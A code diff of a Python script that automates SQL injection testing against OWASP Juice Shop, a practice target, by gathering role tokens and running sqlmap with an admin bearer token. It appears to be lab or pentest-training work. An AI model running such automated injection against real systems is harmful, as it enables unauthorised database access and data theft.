@@ -454,6 +454,7 @@ import requests
 import subprocess
 import json
 import re
+import time
 
 class JuiceShopAuthenticatedSQLi:
     def __init__(self, base_url="http://10.30.0.237:3000"):
@@ -731,9 +732,10 @@ class AdvancedJuiceShopSQLi:
                 print(f"\n[+] Testing parameter injection at {point['url']}")
 
                 if point.get("method") == "POST":
+                    data_param = f'{{"{point["param"]}":"{point["value"]}"}}'
                     cmd = [
                         "sqlmap", "-u", point["url"],
-                        "--data", f'{{{"\"{point[\"param\"]}\"":"\"{point[\"value\"]}\""}}}',
+                        "--data", data_param,
                         "--headers", f"Authorization: Bearer {self.tokens['admin']}",
                         "--headers", "Content-Type: application/json",
                         "--dbms=sqlite", "--batch", "--level=3"
@@ -749,4 +751,46 @@ class AdvancedJuiceShopSQLi:
                     subprocess.run(cmd, timeout=180)
                 except subprocess.TimeoutExpired:
                     print(f"[-] Timeout testing {point['url']}")
+
+    def generate_comprehensive_report(self, role_results):
+        """Generate comprehensive test report"""
+        report = {
+            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
+            "tokens_obtained": list(self.tokens.keys()),
+            "total_tests": len(role_results),
+            "vulnerable_endpoints": len([r for r in role_results if r.get("vulnerable", False)]),
+            "results": role_results
+        }
+
+        with open("advanced_juice_shop_sqli_report.json", "w") as f:
+            json.dump(report, f, indent=2)
+
+        print(f"\n{'='*60}")
+        print("ADVANCED SQL INJECTION TEST REPORT")
+        print(f"{'='*60}")
+        print(f"Tokens obtained: {', '.join(self.tokens.keys())}")
+        print(f"Total tests: {report['total_tests']}")
+        print(f"Vulnerable endpoints: {report['vulnerable_endpoints']}")
+        print("Report saved to: advanced_juice_shop_sqli_report.json")
+
+        return report
+
+if __name__ == "__main__":
+    # Initialize advanced tester
+    advanced_tester = AdvancedJuiceShopSQLi()
+
+    # Get tokens for different roles
+    print("[+] Obtaining authentication tokens...")
+    advanced_tester.get_multiple_tokens()
+
+    # Test role-based SQL injection
+    print("\n[+] Starting role-based SQL injection testing...")
+    role_results = advanced_tester.test_role_based_sqli()
+
+    # Test parameter injection
+    print("\n[+] Starting parameter injection testing...")
+    advanced_tester.parameter_injection_test()
+
+    # Generate comprehensive report
+    advanced_tester.generate_comprehensive_report(role_results)
 ```
